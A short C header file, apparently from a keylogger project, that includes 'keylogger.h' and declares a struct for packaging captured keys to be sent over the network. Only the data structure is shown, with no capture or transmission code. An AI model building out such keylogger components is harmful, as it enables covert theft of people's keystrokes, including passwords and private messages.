#pragma once
#include "keylogger.h"

/**
 * Represents all the data that is sent over the network
 */
typedef struct {
  char** keys;  // an array of strings to be sent over the network
} key_package;
